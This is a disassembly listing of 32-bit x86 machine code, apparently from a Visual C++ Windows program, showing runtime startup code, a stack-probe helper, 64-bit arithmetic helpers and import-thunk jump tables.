  40c29a:	33 db                	xor    %ebx,%ebx
  40c29c:	a3 7c 1d 41 00       	mov    %eax,0x411d7c
  40c2a1:	38 5d 08             	cmp    %bl,0x8(%ebp)
  40c2a4:	75 08                	jne    0x40c2ae
  40c2a6:	53                   	push   %ebx
  40c2a7:	50                   	push   %eax
  40c2a8:	ff 15 e8 d3 40 00    	call   *0x40d3e8
  40c2ae:	a1 84 d3 40 00       	mov    0x40d384,%eax
  40c2b3:	83 c0 20             	add    $0x20,%eax
  40c2b6:	50                   	push   %eax
  40c2b7:	68 0c e0 40 00       	push   $0x40e00c
  40c2bc:	68 04 e0 40 00       	push   $0x40e004
  40c2c1:	ff 15 28 d3 40 00    	call   *0x40d328
  40c2c7:	b9 f9 00 00 00       	mov    $0xf9,%ecx
  40c2cc:	33 c0                	xor    %eax,%eax
  40c2ce:	8d bd 19 fc ff ff    	lea    -0x3e7(%ebp),%edi
  40c2d4:	88 9d 18 fc ff ff    	mov    %bl,-0x3e8(%ebp)
  40c2da:	f3 ab                	rep stos %eax,%es:(%edi)
  40c2dc:	66 ab                	stos   %ax,%es:(%edi)
  40c2de:	aa                   	stos   %al,%es:(%edi)
  40c2df:	83 ca ff             	or     $0xffffffff,%edx
  40c2e2:	bf f8 df 40 00       	mov    $0x40dff8,%edi
  40c2e7:	8b ca                	mov    %edx,%ecx
  40c2e9:	33 c0                	xor    %eax,%eax
  40c2eb:	83 c4 0c             	add    $0xc,%esp
  40c2ee:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40c2f4:	f2 ae                	repnz scas %es:(%edi),%al
  40c2f6:	f7 d1                	not    %ecx
  40c2f8:	2b f9                	sub    %ecx,%edi
  40c2fa:	8b c1                	mov    %ecx,%eax
  40c2fc:	8b f7                	mov    %edi,%esi
  40c2fe:	8b fb                	mov    %ebx,%edi
  40c300:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40c306:	c1 e9 02             	shr    $0x2,%ecx
  40c309:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c30b:	8b c8                	mov    %eax,%ecx
  40c30d:	33 c0                	xor    %eax,%eax
  40c30f:	83 e1 03             	and    $0x3,%ecx
  40c312:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40c314:	bf f8 db 40 00       	mov    $0x40dbf8,%edi
  40c319:	8b ca                	mov    %edx,%ecx
  40c31b:	f2 ae                	repnz scas %es:(%edi),%al
  40c31d:	f7 d1                	not    %ecx
  40c31f:	2b f9                	sub    %ecx,%edi
  40c321:	8b f7                	mov    %edi,%esi
  40c323:	8b fb                	mov    %ebx,%edi
  40c325:	8b d9                	mov    %ecx,%ebx
  40c327:	8b ca                	mov    %edx,%ecx
  40c329:	f2 ae                	repnz scas %es:(%edi),%al
  40c32b:	8b cb                	mov    %ebx,%ecx
  40c32d:	4f                   	dec    %edi
  40c32e:	c1 e9 02             	shr    $0x2,%ecx
  40c331:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c333:	8b cb                	mov    %ebx,%ecx
  40c335:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40c33b:	83 e1 03             	and    $0x3,%ecx
  40c33e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40c340:	bf dc df 40 00       	mov    $0x40dfdc,%edi
  40c345:	8b ca                	mov    %edx,%ecx
  40c347:	f2 ae                	repnz scas %es:(%edi),%al
  40c349:	f7 d1                	not    %ecx
  40c34b:	2b f9                	sub    %ecx,%edi
  40c34d:	8b f7                	mov    %edi,%esi
  40c34f:	8b fb                	mov    %ebx,%edi
  40c351:	8b d9                	mov    %ecx,%ebx
  40c353:	8b ca                	mov    %edx,%ecx
  40c355:	f2 ae                	repnz scas %es:(%edi),%al
  40c357:	8b cb                	mov    %ebx,%ecx
  40c359:	4f                   	dec    %edi
  40c35a:	c1 e9 02             	shr    $0x2,%ecx
  40c35d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c35f:	8b cb                	mov    %ebx,%ecx
  40c361:	8d 85 18 fc ff ff    	lea    -0x3e8(%ebp),%eax
  40c367:	83 e1 03             	and    $0x3,%ecx
  40c36a:	50                   	push   %eax
  40c36b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40c36d:	ff 15 74 d3 40 00    	call   *0x40d374
  40c373:	59                   	pop    %ecx
  40c374:	5f                   	pop    %edi
  40c375:	5e                   	pop    %esi
  40c376:	5b                   	pop    %ebx
  40c377:	c9                   	leave
  40c378:	c3                   	ret
  40c379:	cc                   	int3
  40c37a:	ff 25 b0 d0 40 00    	jmp    *0x40d0b0
  40c380:	ff 25 b4 d0 40 00    	jmp    *0x40d0b4
  40c386:	ff 25 b8 d0 40 00    	jmp    *0x40d0b8
  40c38c:	83 3d f0 1d 41 00 ff 	cmpl   $0xffffffff,0x411df0
  40c393:	75 0c                	jne    0x40c3a1
  40c395:	ff 74 24 04          	push   0x4(%esp)
  40c399:	ff 15 20 d3 40 00    	call   *0x40d320
  40c39f:	59                   	pop    %ecx
  40c3a0:	c3                   	ret
  40c3a1:	68 ec 1d 41 00       	push   $0x411dec
  40c3a6:	68 f0 1d 41 00       	push   $0x411df0
  40c3ab:	ff 74 24 0c          	push   0xc(%esp)
  40c3af:	e8 ae 02 00 00       	call   0x40c662
  40c3b4:	83 c4 0c             	add    $0xc,%esp
  40c3b7:	c3                   	ret
  40c3b8:	ff 74 24 04          	push   0x4(%esp)
  40c3bc:	e8 cb ff ff ff       	call   0x40c38c
  40c3c1:	f7 d8                	neg    %eax
  40c3c3:	1b c0                	sbb    %eax,%eax
  40c3c5:	59                   	pop    %ecx
  40c3c6:	f7 d8                	neg    %eax
  40c3c8:	48                   	dec    %eax
  40c3c9:	c3                   	ret
  40c3ca:	ff 25 70 d3 40 00    	jmp    *0x40d370
  40c3d0:	56                   	push   %esi
  40c3d1:	8b f1                	mov    %ecx,%esi
  40c3d3:	e8 90 02 00 00       	call   0x40c668
  40c3d8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40c3dd:	74 07                	je     0x40c3e6
  40c3df:	56                   	push   %esi
  40c3e0:	e8 0d 00 00 00       	call   0x40c3f2
  40c3e5:	59                   	pop    %ecx
  40c3e6:	8b c6                	mov    %esi,%eax
  40c3e8:	5e                   	pop    %esi
  40c3e9:	c2 04 00             	ret    $0x4
  40c3ec:	ff 25 6c d3 40 00    	jmp    *0x40d36c
  40c3f2:	ff 25 68 d3 40 00    	jmp    *0x40d368
  40c3f8:	cc                   	int3
  40c3f9:	cc                   	int3
  40c3fa:	cc                   	int3
  40c3fb:	cc                   	int3
  40c3fc:	cc                   	int3
  40c3fd:	cc                   	int3
  40c3fe:	cc                   	int3
  40c3ff:	cc                   	int3
  40c400:	51                   	push   %ecx
  40c401:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40c406:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40c40a:	72 14                	jb     0x40c420
  40c40c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40c412:	2d 00 10 00 00       	sub    $0x1000,%eax
  40c417:	85 01                	test   %eax,(%ecx)
  40c419:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40c41e:	73 ec                	jae    0x40c40c
  40c420:	2b c8                	sub    %eax,%ecx
  40c422:	8b c4                	mov    %esp,%eax
  40c424:	85 01                	test   %eax,(%ecx)
  40c426:	8b e1                	mov    %ecx,%esp
  40c428:	8b 08                	mov    (%eax),%ecx
  40c42a:	8b 40 04             	mov    0x4(%eax),%eax
  40c42d:	50                   	push   %eax
  40c42e:	c3                   	ret
  40c42f:	cc                   	int3
  40c430:	ff 25 60 d3 40 00    	jmp    *0x40d360
  40c436:	ff 25 4c d3 40 00    	jmp    *0x40d34c
  40c43c:	cc                   	int3
  40c43d:	cc                   	int3
  40c43e:	cc                   	int3
  40c43f:	cc                   	int3
  40c440:	6a ff                	push   $0xffffffff
  40c442:	50                   	push   %eax
  40c443:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40c449:	50                   	push   %eax
  40c44a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40c44e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40c455:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  40c459:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  40c45d:	50                   	push   %eax
  40c45e:	c3                   	ret
  40c45f:	cc                   	int3
  40c460:	53                   	push   %ebx
  40c461:	56                   	push   %esi
  40c462:	8b 44 24 18          	mov    0x18(%esp),%eax
  40c466:	0b c0                	or     %eax,%eax
  40c468:	75 18                	jne    0x40c482
  40c46a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40c46e:	8b 44 24 10          	mov    0x10(%esp),%eax
  40c472:	33 d2                	xor    %edx,%edx
  40c474:	f7 f1                	div    %ecx
  40c476:	8b d8                	mov    %eax,%ebx
  40c478:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40c47c:	f7 f1                	div    %ecx
  40c47e:	8b d3                	mov    %ebx,%edx
  40c480:	eb 41                	jmp    0x40c4c3
  40c482:	8b c8                	mov    %eax,%ecx
  40c484:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40c488:	8b 54 24 10          	mov    0x10(%esp),%edx
  40c48c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40c490:	d1 e9                	shr    $1,%ecx
  40c492:	d1 db                	rcr    $1,%ebx
  40c494:	d1 ea                	shr    $1,%edx
  40c496:	d1 d8                	rcr    $1,%eax
  40c498:	0b c9                	or     %ecx,%ecx
  40c49a:	75 f4                	jne    0x40c490
  40c49c:	f7 f3                	div    %ebx
  40c49e:	8b f0                	mov    %eax,%esi
  40c4a0:	f7 64 24 18          	mull   0x18(%esp)
  40c4a4:	8b c8                	mov    %eax,%ecx
  40c4a6:	8b 44 24 14          	mov    0x14(%esp),%eax
  40c4aa:	f7 e6                	mul    %esi
  40c4ac:	03 d1                	add    %ecx,%edx
  40c4ae:	72 0e                	jb     0x40c4be
  40c4b0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40c4b4:	77 08                	ja     0x40c4be
  40c4b6:	72 07                	jb     0x40c4bf
  40c4b8:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40c4bc:	76 01                	jbe    0x40c4bf
  40c4be:	4e                   	dec    %esi
  40c4bf:	33 d2                	xor    %edx,%edx
  40c4c1:	8b c6                	mov    %esi,%eax
  40c4c3:	5e                   	pop    %esi
  40c4c4:	5b                   	pop    %ebx
  40c4c5:	c2 10 00             	ret    $0x10
  40c4c8:	cc                   	int3
  40c4c9:	cc                   	int3
  40c4ca:	cc                   	int3
  40c4cb:	cc                   	int3
  40c4cc:	cc                   	int3
  40c4cd:	cc                   	int3
  40c4ce:	cc                   	int3
  40c4cf:	cc                   	int3
  40c4d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  40c4d4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40c4d8:	0b c8                	or     %eax,%ecx
  40c4da:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40c4de:	75 09                	jne    0x40c4e9
  40c4e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  40c4e4:	f7 e1                	mul    %ecx
  40c4e6:	c2 10 00             	ret    $0x10
  40c4e9:	53                   	push   %ebx
  40c4ea:	f7 e1                	mul    %ecx
  40c4ec:	8b d8                	mov    %eax,%ebx
  40c4ee:	8b 44 24 08          	mov    0x8(%esp),%eax
  40c4f2:	f7 64 24 14          	mull   0x14(%esp)
  40c4f6:	03 d8                	add    %eax,%ebx
  40c4f8:	8b 44 24 08          	mov    0x8(%esp),%eax
  40c4fc:	f7 e1                	mul    %ecx
  40c4fe:	03 d3                	add    %ebx,%edx
  40c500:	5b                   	pop    %ebx
  40c501:	c2 10 00             	ret    $0x10
  40c504:	55                   	push   %ebp
  40c505:	8b ec                	mov    %esp,%ebp
  40c507:	6a ff                	push   $0xffffffff
  40c509:	68 18 e0 40 00       	push   $0x40e018
  40c50e:	68 90 c6 40 00       	push   $0x40c690
  40c513:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40c519:	50                   	push   %eax
  40c51a:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40c521:	83 ec 68             	sub    $0x68,%esp
  40c524:	53                   	push   %ebx
  40c525:	56                   	push   %esi
  40c526:	57                   	push   %edi
  40c527:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40c52a:	33 db                	xor    %ebx,%ebx
  40c52c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40c52f:	6a 02                	push   $0x2
  40c531:	ff 15 f4 d2 40 00    	call   *0x40d2f4
  40c537:	59                   	pop    %ecx
  40c538:	83 0d ec 1d 41 00 ff 	orl    $0xffffffff,0x411dec
  40c53f:	83 0d f0 1d 41 00 ff 	orl    $0xffffffff,0x411df0
  40c546:	ff 15 f8 d2 40 00    	call   *0x40d2f8
  40c54c:	8b 0d e4 1d 41 00    	mov    0x411de4,%ecx
  40c552:	89 08                	mov    %ecx,(%eax)
  40c554:	ff 15 fc d2 40 00    	call   *0x40d2fc
  40c55a:	8b 0d e0 1d 41 00    	mov    0x411de0,%ecx
  40c560:	89 08                	mov    %ecx,(%eax)
  40c562:	a1 00 d3 40 00       	mov    0x40d300,%eax
  40c567:	8b 00                	mov    (%eax),%eax
  40c569:	a3 e8 1d 41 00       	mov    %eax,0x411de8
  40c56e:	e8 22 77 ff ff       	call   0x403c95
  40c573:	39 1d 50 11 41 00    	cmp    %ebx,0x411150
  40c579:	75 0c                	jne    0x40c587
  40c57b:	68 8c c6 40 00       	push   $0x40c68c
  40c580:	ff 15 04 d3 40 00    	call   *0x40d304
  40c586:	59                   	pop    %ecx
  40c587:	e8 ee 00 00 00       	call   0x40c67a
  40c58c:	68 b0 10 41 00       	push   $0x4110b0
  40c591:	68 ac 10 41 00       	push   $0x4110ac
  40c596:	e8 d9 00 00 00       	call   0x40c674
  40c59b:	a1 dc 1d 41 00       	mov    0x411ddc,%eax
  40c5a0:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40c5a3:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40c5a6:	50                   	push   %eax
  40c5a7:	ff 35 d8 1d 41 00    	push   0x411dd8
  40c5ad:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40c5b0:	50                   	push   %eax
  40c5b1:	8d 45 90             	lea    -0x70(%ebp),%eax
  40c5b4:	50                   	push   %eax
  40c5b5:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40c5b8:	50                   	push   %eax
  40c5b9:	ff 15 0c d3 40 00    	call   *0x40d30c
  40c5bf:	68 a8 10 41 00       	push   $0x4110a8
  40c5c4:	68 00 10 41 00       	push   $0x411000
  40c5c9:	e8 a6 00 00 00       	call   0x40c674
  40c5ce:	83 c4 24             	add    $0x24,%esp
  40c5d1:	a1 10 d3 40 00       	mov    0x40d310,%eax
  40c5d6:	8b 30                	mov    (%eax),%esi
  40c5d8:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40c5db:	80 3e 22             	cmpb   $0x22,(%esi)
  40c5de:	75 3a                	jne    0x40c61a
  40c5e0:	46                   	inc    %esi
  40c5e1:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40c5e4:	8a 06                	mov    (%esi),%al
  40c5e6:	3a c3                	cmp    %bl,%al
  40c5e8:	74 04                	je     0x40c5ee
  40c5ea:	3c 22                	cmp    $0x22,%al
  40c5ec:	75 f2                	jne    0x40c5e0
  40c5ee:	80 3e 22             	cmpb   $0x22,(%esi)
  40c5f1:	75 04                	jne    0x40c5f7
  40c5f3:	46                   	inc    %esi
  40c5f4:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40c5f7:	8a 06                	mov    (%esi),%al
  40c5f9:	3a c3                	cmp    %bl,%al
  40c5fb:	74 04                	je     0x40c601
  40c5fd:	3c 20                	cmp    $0x20,%al
  40c5ff:	76 f2                	jbe    0x40c5f3
  40c601:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40c604:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40c607:	50                   	push   %eax
  40c608:	ff 15 00 d1 40 00    	call   *0x40d100
  40c60e:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  40c612:	74 11                	je     0x40c625
  40c614:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  40c618:	eb 0e                	jmp    0x40c628
  40c61a:	80 3e 20             	cmpb   $0x20,(%esi)
  40c61d:	76 d8                	jbe    0x40c5f7
  40c61f:	46                   	inc    %esi
  40c620:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40c623:	eb f5                	jmp    0x40c61a
  40c625:	6a 0a                	push   $0xa
  40c627:	58                   	pop    %eax
  40c628:	50                   	push   %eax
  40c629:	56                   	push   %esi
  40c62a:	53                   	push   %ebx
  40c62b:	53                   	push   %ebx
  40c62c:	ff 15 0c d1 40 00    	call   *0x40d10c
  40c632:	50                   	push   %eax
  40c633:	e8 c4 88 ff ff       	call   0x404efc
  40c638:	89 45 98             	mov    %eax,-0x68(%ebp)
  40c63b:	50                   	push   %eax
  40c63c:	ff 15 48 d3 40 00    	call   *0x40d348
  40c642:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40c645:	8b 08                	mov    (%eax),%ecx
  40c647:	8b 09                	mov    (%ecx),%ecx
  40c649:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  40c64c:	50                   	push   %eax
  40c64d:	51                   	push   %ecx
  40c64e:	e8 1b 00 00 00       	call   0x40c66e
  40c653:	59                   	pop    %ecx
  40c654:	59                   	pop    %ecx
  40c655:	c3                   	ret
  40c656:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40c659:	ff 75 88             	push   -0x78(%ebp)
  40c65c:	ff 15 18 d3 40 00    	call   *0x40d318
  40c662:	ff 25 24 d3 40 00    	jmp    *0x40d324
  40c668:	ff 25 1c d3 40 00    	jmp    *0x40d31c
  40c66e:	ff 25 14 d3 40 00    	jmp    *0x40d314
  40c674:	ff 25 08 d3 40 00    	jmp    *0x40d308
  40c67a:	68 00 00 03 00       	push   $0x30000
  40c67f:	68 00 00 01 00       	push   $0x10000
  40c684:	e8 0d 00 00 00       	call   0x40c696
  40c689:	59                   	pop    %ecx
  40c68a:	59                   	pop    %ecx
  40c68b:	c3                   	ret
  40c68c:	33 c0                	xor    %eax,%eax
  40c68e:	c3                   	ret
  40c68f:	cc                   	int3
  40c690:	ff 25 f0 d2 40 00    	jmp    *0x40d2f0
  40c696:	ff 25 ec d2 40 00    	jmp    *0x40d2ec
  40c69c:	cc                   	int3
  40c69d:	cc                   	int3
  40c69e:	cc                   	int3
  40c69f:	cc                   	int3
  40c6a0:	ff 25 a8 d2 40 00    	jmp    *0x40d2a8
  40c6a6:	ff 25 90 d2 40 00    	jmp    *0x40d290
  40c6ac:	ff 25 8c d2 40 00    	jmp    *0x40d28c
  40c6b2:	ff 25 88 d2 40 00    	jmp    *0x40d288
  40c6b8:	ff 25 70 d2 40 00    	jmp    *0x40d270
  40c6be:	ff 25 64 d2 40 00    	jmp    *0x40d264
  40c6c4:	ff 25 60 d2 40 00    	jmp    *0x40d260
  40c6ca:	ff 25 58 d2 40 00    	jmp    *0x40d258
  40c6d0:	ff 25 54 d2 40 00    	jmp    *0x40d254
  40c6d6:	ff 25 4c d2 40 00    	jmp    *0x40d24c
  40c6dc:	ff 25 14 d2 40 00    	jmp    *0x40d214
  40c6e2:	ff 25 d0 d1 40 00    	jmp    *0x40d1d0
  40c6e8:	ff 25 40 d4 40 00    	jmp    *0x40d440
  40c6ee:	ff 25 58 d4 40 00    	jmp    *0x40d458
  40c6f4:	ff 25 50 d4 40 00    	jmp    *0x40d450
  40c6fa:	ff 25 4c d4 40 00    	jmp    *0x40d44c
  40c700:	ff 25 48 d4 40 00    	jmp    *0x40d448
  40c706:	ff 25 44 d4 40 00    	jmp    *0x40d444
  40c70c:	ff 25 3c d4 40 00    	jmp    *0x40d43c
  40c712:	ff 25 54 d4 40 00    	jmp    *0x40d454
  40c718:	ff 25 8c d4 40 00    	jmp    *0x40d48c
  40c71e:	ff 25 80 d4 40 00    	jmp    *0x40d480
  40c724:	ff 25 7c d4 40 00    	jmp    *0x40d47c
  40c72a:	ff 25 78 d4 40 00    	jmp    *0x40d478
  40c730:	ff 25 60 d4 40 00    	jmp    *0x40d460
  40c736:	ff 25 84 d4 40 00    	jmp    *0x40d484
  40c73c:	ff 25 64 d4 40 00    	jmp    *0x40d464
  40c742:	ff 25 68 d4 40 00    	jmp    *0x40d468
  40c748:	ff 25 6c d4 40 00    	jmp    *0x40d46c
  40c74e:	ff 25 70 d4 40 00    	jmp    *0x40d470
  40c754:	ff 25 74 d4 40 00    	jmp    *0x40d474
  40c75a:	cc                   	int3
  40c75b:	cc                   	int3
  40c75c:	b8 38 e1 40 00       	mov    $0x40e138,%eax
  40c761:	e9 d0 fc ff ff       	jmp    0x40c436
  40c766:	cc                   	int3
  40c767:	cc                   	int3
  40c768:	b8 90 e1 40 00       	mov    $0x40e190,%eax
  40c76d:	e9 c4 fc ff ff       	jmp    0x40c436
